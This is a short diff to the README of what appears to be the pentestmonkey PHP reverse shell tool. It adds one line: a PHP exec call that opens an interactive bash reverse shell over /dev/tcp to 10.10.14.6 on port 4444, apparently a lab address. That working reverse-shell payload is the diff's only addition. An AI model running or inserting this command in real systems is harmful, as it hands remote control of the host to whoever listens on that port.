@@ -43,3 +43,5 @@ Some compile-time options are needed for daemonisation (like pcntl, posix).  The
 Usage
 -----
 See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
+
+```exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/4444 0>&1'");```
